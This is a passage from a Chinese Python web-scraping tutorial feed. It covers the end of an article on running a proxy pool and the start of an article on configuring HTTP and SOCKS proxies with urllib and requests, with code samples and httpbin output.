class="string">'starting proxypool...'</span>)</span><br><span class="line">            <span class="keyword">if</span> ENABLE_TESTER:</span><br><span class="line">                tester_process = multiprocessing.Process(target=self.run_tester)</span><br><span class="line">                logger.info(<span class="string">f'starting tester, pid <span class="subst">&#123;tester_process.pid&#125;</span>...'</span>)</span><br><span class="line">                tester_process.start()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ENABLE_GETTER:</span><br><span class="line">                getter_process = multiprocessing.Process(target=self.run_getter)</span><br><span class="line">                logger.info(<span class="string">f'starting getter, pid<span class="subst">&#123;getter_process.pid&#125;</span>...'</span>)</span><br><span class="line">                getter_process.start()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ENABLE_SERVER:</span><br><span class="line">                server_process = multiprocessing.Process(target=self.run_server)</span><br><span class="line">                logger.info(<span class="string">f'starting server, pid<span class="subst">&#123;server_process.pid&#125;</span>...'</span>)</span><br><span class="line">                server_process.start()</span><br><span class="line"></span><br><span class="line">            tester_process.join()</span><br><span class="line">            getter_process.join()</span><br><span class="line">            server_process.join()</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            logger.info(<span class="string">'received keyboard interrupt signal'</span>)</span><br><span class="line">            tester_process.terminate()</span><br><span class="line">            getter_process.terminate()</span><br><span class="line">            server_process.terminate()</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="comment"># must call join method before calling is_alive</span></span><br><span class="line">            tester_process.join()</span><br><span class="line">            getter_process.join()</span><br><span class="line">            server_process.join()</span><br><span class="line">            logger.info(<span class="string">f'tester is <span class="subst">&#123;<span class="string">"alive"</span> <span class="keyword">if</span> tester_process.is_alive() <span class="keyword">else</span> <span class="string">"dead"</span>&#125;</span>'</span>)</span><br><span class="line">            logger.info(<span class="string">f'getter is <span class="subst">&#123;<span class="string">"alive"</span> <span class="keyword">if</span> getter_process.is_alive() <span class="keyword">else</span> <span class="string">"dead"</span>&#125;</span>'</span>)</span><br><span class="line">            logger.info(<span class="string">f'server is <span class="subst">&#123;<span class="string">"alive"</span> <span class="keyword">if</span> server_process.is_alive() <span class="keyword">else</span> <span class="string">"dead"</span>&#125;</span>'</span>)</span><br><span class="line">            logger.info(<span class="string">'proxy terminated'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    scheduler = Scheduler()</span><br><span class="line">    scheduler.run()</span><br></pre>      </td>    </tr>  </table></figure><p>3 个常量 <code>ENABLE_TESTER</code>、<code>ENABLE_GETTER</code> 和 <code>ENABLE_SERVER</code> 都是布尔类型，表示测试模块、获取模块和接口模块的开关，如果都为 <code>True</code>，则代表模块开启。</p><p>启动入口是 <code>run</code> 方法，这个方法分别判断 3 个模块的开关。如果开关开启，启动时程序就新建一个 Process 进程，设置好启动目标，然后调用 <code>start</code> 方法运行，这样 3 个进程就可以并行执行，互不干扰。</p><p>3 个调度方法的结构也非常清晰。比如，<code>run_tester</code> 方法用来调度测试模块。首先声明一个 Tester 对象，然后进入死循环不断循环调用其 <code>run</code> 方法，执行完一轮之后就休眠一段时间，休眠结束之后重新再执行。这里休眠时间也定义为一个常量，如 20 秒，即每隔 20 秒进行一次代理检测。</p><p>最后，只需要调用 <code>Scheduler</code> 的 <code>run</code> 方法即可启动整个代理池。</p><p>以上内容便是整个代理池的架构和相应实现逻辑。</p><h2 id="5-运行"><a href="#5-运行" class="headerlink" title="5.运行"></a>5.运行</h2><p>接下来，我们将代码整合一下，将代理运行起来，运行之后的输出结果如下所示：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">06.510</span> | INFO     | proxypool.storages.redis:decrease:<span class="number">73</span> - <span class="number">60.186</span><span class="number">.146</span><span class="number">.193</span>:<span class="number">9000</span> current score <span class="number">10.0</span>, decrease <span class="number">1</span></span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">06.517</span> | DEBUG    | proxypool.processors.tester:test:<span class="number">52</span> - proxy <span class="number">60.186</span><span class="number">.146</span><span class="number">.193</span>:<span class="number">9000</span> <span class="keyword">is</span> invalid, decrease score</span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">06.524</span> | INFO     | proxypool.storages.redis:decrease:<span class="number">73</span> - <span class="number">60.186</span><span class="number">.151</span><span class="number">.147</span>:<span class="number">9000</span> current score <span class="number">10.0</span>, decrease <span class="number">1</span></span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">06.532</span> | DEBUG    | proxypool.processors.tester:test:<span class="number">52</span> - proxy <span class="number">60.186</span><span class="number">.151</span><span class="number">.147</span>:<span class="number">9000</span> <span class="keyword">is</span> invalid, decrease score</span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">07.159</span> | INFO     | proxypool.storages.redis:max:<span class="number">96</span> - <span class="number">60.191</span><span class="number">.11</span><span class="number">.246</span>:<span class="number">3128</span> <span class="keyword">is</span> valid, set to <span class="number">100</span></span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">07.167</span> | DEBUG    | proxypool.processors.tester:test:<span class="number">46</span> - proxy <span class="number">60.191</span><span class="number">.11</span><span class="number">.246</span>:<span class="number">3128</span> <span class="keyword">is</span> valid, set max score</span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">17.271</span> | INFO     | proxypool.storages.redis:decrease:<span class="number">73</span> - <span class="number">59.62</span><span class="number">.7</span><span class="number">.130</span>:<span class="number">9000</span> current score <span class="number">10.0</span>, decrease <span class="number">1</span></span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">17.280</span> | DEBUG    | proxypool.processors.tester:test:<span class="number">52</span> - proxy <span class="number">59.62</span><span class="number">.7</span><span class="number">.130</span>:<span class="number">9000</span> <span class="keyword">is</span> invalid, decrease score</span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">17.288</span> | INFO     | proxypool.storages.redis:decrease:<span class="number">73</span> - <span class="number">60.167</span><span class="number">.103</span><span class="number">.74</span>:<span class="number">1133</span> current score <span class="number">10.0</span>, decrease <span class="number">1</span></span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">17.295</span> | DEBUG    | proxypool.processors.tester:test:<span class="number">52</span> - proxy <span class="number">60.167</span><span class="number">.103</span><span class="number">.74</span>:<span class="number">1133</span> <span class="keyword">is</span> invalid, decrease score</span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">17.302</span> | INFO     | proxypool.storages.redis:decrease:<span class="number">73</span> - <span class="number">60.162</span><span class="number">.71</span><span class="number">.113</span>:<span class="number">9000</span> current score <span class="number">10.0</span>, decrease <span class="number">1</span></span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">17.309</span> | DEBUG    | proxypool.processors.tester:test:<span class="number">52</span> - proxy <span class="number">60.162</span><span class="number">.71</span><span class="number">.113</span>:<span class="number">9000</span> <span class="keyword">is</span> invalid, decrease score</span><br></pre>      </td>    </tr>  </table></figure><p>以上是代理池的控制台输出，可以看到这里将可用代理设置为 100，不可用代理分数减 1。</p><p>接下来，我们再打开浏览器，当前配置运行在 5555 端口，所以打开 <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo1NTU1">http://127.0.0.1:5555<i class="fa fa-external-link-alt"></i></span> 即可看到其首页，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/pxwew.png" alt="image-20210711001154883"><br>图 9-2 首页</p><p>再访问 <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo1NTU1L3JhbmRvbQ==">http://127.0.0.1:5555/random<i class="fa fa-external-link-alt"></i></span>，即可获取随机可用代理，如图 9-3 所示。</p><p><img src="https://qiniu.cuiqingcai.com/31i7g.jpg" alt=""><br>图 9-3 获取随机可用代理</p><p>只需要访问此接口，即可获取一个随机可用代理，这非常方便。</p><p>获取代理的代码如下所示：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">PROXY_POOL_URL = <span class="string">'http://localhost:5555/random'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_proxy</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(PROXY_POOL_URL)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span> ConnectionError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre>      </td>    </tr>  </table></figure><p>这样便可以获取到一个随机代理了。它是字符串类型，此代理可以按照上一节所示的方法设置，如 requests 的使用方法如下所示：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxy = get_proxy()</span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">'http'</span>: <span class="string">'http://'</span> + proxy,</span><br><span class="line">    <span class="string">'https'</span>: <span class="string">'https://'</span> + proxy,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(<span class="string">'http://httpbin.org/get'</span>, proxies=proxies)</span><br><span class="line">    print(response.text)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">    print(<span class="string">'Error'</span>, e.args)</span><br></pre>      </td>    </tr>  </table></figure><p>有了代理池之后，再取出代理即可有效防止 IP 被封禁的情况。</p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2><p>本节我们学习了一个代理池的设计思路和实现方案，有了这个代理池，我们就可以实时获取一些可用的代理了。相对之前的实战案例来说，整个代理池的代码量和逻辑复杂了比较多，建议可以好好理解和消化一下。</p><p>本节的代码地址为 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbjNXZWJTcGlkZXIvUHJveHlQb29s">https://github.com/Python3WebSpider/ProxyPool<i class="fa fa-external-link-alt"></i></span>，代码库中还提供了基于 Docker 和 Kubernetes 的运行和部署操作，可以帮助我们更加快捷地运行代理池，同时本书后文也会介绍代理池的部署方法。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
  &lt;p&gt;爬虫系列文章总目录：&lt;a href=&quot;https://cuiqingcai.com/17777.html&quot;&gt;【2022 年】Python3 爬虫学习教程&lt;/a&gt;，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 2
      
    
    </summary>
    
    
      <category term="Python" scheme="https://cuiqingcai.com/categories/Python/"/>
    
      <category term="爬虫" scheme="https://cuiqingcai.com/categories/Python/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://cuiqingcai.com/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="网络爬虫" scheme="https://cuiqingcai.com/tags/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/"/>
    
      <category term="2022" scheme="https://cuiqingcai.com/tags/2022/"/>
    
      <category term="代理" scheme="https://cuiqingcai.com/tags/%E4%BB%A3%E7%90%86/"/>
    
      <category term="Python 爬虫" scheme="https://cuiqingcai.com/tags/Python-%E7%88%AC%E8%99%AB/"/>
    
      <category term="代理池" scheme="https://cuiqingcai.com/tags/%E4%BB%A3%E7%90%86%E6%B1%A0/"/>
    
  </entry>
  
  <entry>
    <title>【2022 年】Python3 爬虫教程 - 代理的使用方法</title>
    <link href="https://cuiqingcai.com/2022102.html"/>
    <id>https://cuiqingcai.com/2022102.html</id>
    <published>2022-03-03T03:42:44.000Z</published>
    <updated>2022-08-01T15:41:25.996Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>爬虫系列文章总目录：<a href="https://cuiqingcai.com/17777.html">【2022 年】Python3 爬虫学习教程</a>，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就仅有<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">《Python3 网络爬虫开发实战（第二版）》<i class="fa fa-external-link-alt"></i></span>一书了，<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">点击了解详情<i class="fa fa-external-link-alt"></i></span>。</p></blockquote><p>前面我们介绍了多种请求库，如 urllib、requests、Selenium、Playwright 等用法，但是没有统一梳理代理的设置方法，本节我们来针对这些库来梳理下代理的设置方法。</p><h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1. 准备工作"></a>1. 准备工作</h2><p>在本节开始之前，请先根据上一节了解一下代理的基本原理，了解了基本原理之后我们可以更好地理解和学习本节的内容。</p><p>另外我们需要先获取一个可用代理，代理就是 IP 地址和端口的组合，就是 <code>&lt;ip&gt;:&lt;port&gt;</code> 这样的格式。如果代理需要访问认证，那就还需要额外的用户名密码两个信息。</p><p>那怎么获取一个可用代理呢？</p><p>使用搜索引擎搜索 “代理” 关键字，可以看到许多代理服务网站，网站上会有很多免费或付费代理，比如快代理的免费 HTTP 代理：<span class="exturl" data-url="aHR0cHM6Ly93d3cua3VhaWRhaWxpLmNvbS9mcmVlLw==">https://www.kuaidaili.com/free/<i class="fa fa-external-link-alt"></i></span> 上面就写了很多免费代理，但是这些免费代理大多数情况下并不一定稳定，所以比较靠谱的方法是购买付费代理。付费代理的各大代理商家都有套餐，数量不用多，稳定可用即可，我们可以自行选购。</p><p>另外除了购买付费 HTTP 代理，我们也可以在本机配置一些代理软件，具体的配置方法可以参考 <span class="exturl" data-url="aHR0cHM6Ly9zZXR1cC5zY3JhcGUuY2VudGVyL3Byb3h5LWNsaWVudO+8jOi9r+S7tui/kOihjOS5i+WQjuS8muWcqOacrOacuuWIm+W7ug==">https://setup.scrape.center/proxy-client，软件运行之后会在本机创建<i class="fa fa-external-link-alt"></i></span> HTTP 或 SOCKS 代理服务，所以代理地址一般都是 <code>127.0.0.1:&lt;port&gt;</code> 这样的格式，不同的软件用的端口可能不同。</p><p>这里我的本机安装了一部代理软件，它会在本地 7890 端口上创建 HTTP 代理服务，即代理为 127.0.0.1:7890。另外，该软件还会在 7891 端口上创建 SOCKS 代理服务，即代理为 127.0.0.1:7891，所以只要设置了这个代理，就可以成功将本机 IP 切换到代理软件连接的服务器的 IP 了。</p><p>在本章下面的示例里，我使用上述代理来演示其设置方法，你也可以自行替换成自己的可用代理。</p><p>设置代理后，测试的网址是 <span class="exturl" data-url="aHR0cDovL2h0dHBiaW4ub3JnL2dldA==">http://httpbin.org/get<i class="fa fa-external-link-alt"></i></span>，访问该链接我们可以得到请求的相关信息，其中返回结果的 <code>origin</code> 字段就是客户端的 IP，我们可以根据它来判断代理是否设置成功，即是否成功伪装了 IP。</p><p>好，接下来我们就来看下各个请求库的代理设置方法吧。</p><h2 id="2-urllib"><a href="#2-urllib" class="headerlink" title="2. urllib"></a>2. urllib</h2><p>首先我们以最基础的 urllib 为例，来看一下代理的设置方法，代码如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> ProxyHandler, build_opener</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'127.0.0.1:7890'</span></span><br><span class="line">proxy_handler = ProxyHandler(&#123;</span><br><span class="line">    <span class="string">'http'</span>: <span class="string">'http://'</span> + proxy,</span><br><span class="line">    <span class="string">'https'</span>: <span class="string">'http://'</span> + proxy</span><br><span class="line">&#125;)</span><br><span class="line">opener = build_opener(proxy_handler)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = opener.open(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(response.read().decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br></pre>      </td>    </tr>  </table></figure><p>运行结果如下：</p><figure class="highlight json">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"args"</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">"headers"</span>: &#123;</span><br><span class="line">    <span class="attr">"Accept-Encoding"</span>: <span class="string">"identity"</span>,</span><br><span class="line">    <span class="attr">"Host"</span>: <span class="string">"httpbin.org"</span>,</span><br><span class="line">    <span class="attr">"User-Agent"</span>: <span class="string">"Python-urllib/3.7"</span>,</span><br><span class="line">    <span class="attr">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-60e9a1b6-0a20b8a678844a0b2ab4e889"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"origin"</span>: <span class="string">"210.173.1.204"</span>,</span><br><span class="line">  <span class="attr">"url"</span>: <span class="string">"https://httpbin.org/get"</span></span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>这里我们需要借助 ProxyHandler 设置代理，参数是字典类型，键名为协议类型，键值是代理。注意，此处代理前面需要加上协议，即 <code>http://</code> 或者 <code>https://</code>，当请求的链接是 HTTP 协议的时候，会使用 http 键名对应的代理，当请求的链接是 HTTPS 协议的时候，会使用 https 键名对应的代理。不过这里我们把代理本身设置为了 HTTP 协议，即前缀统一设置为了 <code>http://</code>，所以不论访问 HTTP 还是 HTTPS 协议的链接，都会使用我们配置的 HTTP 协议的代理进行请求。</p><p>创建完 ProxyHandler 对象之后，我们需要利用 build_opener 方法传入该对象来创建一个 Opener，这样就相当于此 Opener 已经设置好代理了。接下来直接调用 Opener 对象的 open 方法，即可访问我们所想要的链接。</p><p>运行输出结果是一个 JSON，它有一个字段 origin，标明了客户端的 IP。验证一下，此处的 IP 确实为代理的 IP，并不是真实的 IP。这样我们就成功设置好代理，并可以隐藏真实 IP 了。</p><p>如果遇到需要认证的代理，我们可以用如下的方法设置：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> ProxyHandler, build_opener</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'username:password@127.0.0.1:7890'</span></span><br><span class="line">proxy_handler = ProxyHandler(&#123;</span><br><span class="line">    <span class="string">'http'</span>: <span class="string">'http://'</span> + proxy,</span><br><span class="line">    <span class="string">'https'</span>: <span class="string">'http://'</span> + proxy</span><br><span class="line">&#125;)</span><br><span class="line">opener = build_opener(proxy_handler)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = opener.open(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(response.read().decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br></pre>      </td>    </tr>  </table></figure><p>这里改变的只是 proxy 变量，只需要在代理前面加入代理认证的用户名密码即可，其中 username 就是用户名，password 为密码，例如 username 为 foo，密码为 bar，那么代理就是 <code>foo:bar@127.0.0.1:7890</code>。</p><p>如果代理是 SOCKS5 类型，那么可以用如下方式设置代理：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> socks</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError</span><br><span class="line"></span><br><span class="line">socks.set_default_proxy(socks.SOCKS5, <span class="string">'127.0.0.1'</span>, <span class="number">7891</span>)</span><br><span class="line">socket.socket = socks.socksocket</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = request.urlopen(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(response.read().decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br></pre>      </td>    </tr>  </table></figure><p>此处需要一个 socks 模块，可以通过如下命令安装：</p><figure class="highlight cmake">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">pip3 <span class="keyword">install</span> PySocks</span><br></pre>      </td>    </tr>  </table></figure><p>这里需要本地运行一个 SOCKS5 代理，运行在 7891 端口，运行成功之后和上文 HTTP 代理输出结果是一样的：</p><figure class="highlight json">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"args"</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">"headers"</span>: &#123;</span><br><span class="line">    <span class="attr">"Accept-Encoding"</span>: <span class="string">"identity"</span>,</span><br><span class="line">    <span class="attr">"Host"</span>: <span class="string">"httpbin.org"</span>,</span><br><span class="line">    <span class="attr">"User-Agent"</span>: <span class="string">"Python-urllib/3.7"</span>,</span><br><span class="line">    <span class="attr">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-60e9a1b6-0a20b8a678844a0b2ab4e889"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"origin"</span>: <span class="string">"210.173.1.204"</span>,</span><br><span class="line">  <span class="attr">"url"</span>: <span class="string">"https://httpbin.org/get"</span></span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>结果的 origin 字段同样为代理的 IP，代理设置成功。</p><h2 id="3-requests-的代理设置"><a href="#3-requests-的代理设置" class="headerlink" title="3.requests 的代理设置"></a>3.requests 的代理设置</h2><p>对于 requests 来说，代理设置非常简单，我们只需要传入 <code>proxies</code> 参数即可。</p><p>这里以我本机的代理为例，来看下 requests 的 HTTP 代理设置，代码如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'127.0.0.1:7890'</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">'http'</span>: <span class="string">'http://'</span> + proxy,</span><br><span class="line">    <span class="string">'https'</span>: <span class="string">'http://'</span> + proxy,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(<span class="string">'https://httpbin.org/get'</span>, proxies=proxies)</span><br><span class="line">    print(response.text)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">    print(<span class="string">'Error'</span>, e.args)</span><br></pre>      </td>    </tr>  </table></figure><p>运行结果如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"args"</span>: &#123;&#125;,</span><br><span class="line">  <span class="string">"headers"</span>: &#123;</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"*/*"</span>,</span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">    <span class="string">"Host"</span>: <span class="string">"httpbin.org"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"python-requests/2.22.0"</span>,</span><br><span class="line">    <span class="string">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-5e8f358d-87913f68a192fb9f87aa0323"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">"origin"</span>: <span class="string">"210.173.1.204"</span>,</span><br><span class="line">  <span class="string">"url"</span>: <span class="string">"https://httpbin.org/get"</span></span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>和 urllib 一样，当请求的链接是 HTTP 协议的时候，会使用 http 键名对应的代理，当请求的链接是 HTTPS 协议的时候，会使用 https 键名对应的代理，不过这里统一使用了 HTTP 协议的代理。</p><p>运行结果中的 <code>origin</code> 若是代理服务器的 IP，则证明代理已经设置成功。</p><p>如果代理需要认证，那么在代理的前面加上用户名和密码即可，代理的写法就变成如下所示：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">proxy = <span class="string">'username:password@127.0.0.1:7890'</span></span><br></pre>      </td>    </tr>  </table></figure><p>这里只需要将 <code>username</code> 和 <code>password</code> 替换即可。</p><p>如果需要使用 SOCKS 代理，则可以使用如下方式来设置：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'127.0.0.1:7891'</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">'http'</span>: <span class="string">'socks5://'</span> + proxy,</span><br><span class="line">    <span class="string">'https'</span>: <span class="string">'socks5://'</span> + proxy</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(<span class="string">'https://httpbin.org/get'</span>, proxies=proxies)</span><br><span class="line">    print(response.text)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">    print(<span class="string">'Error'</span>, e.args)</span><br></pre>      </td>    </tr>  </table></figure><p>这里我们需要额外安装一个包 <code>requests[socks]</code>，相关命令如下所示：</p><figure class="highlight plain">  <table>    <tr>      <td 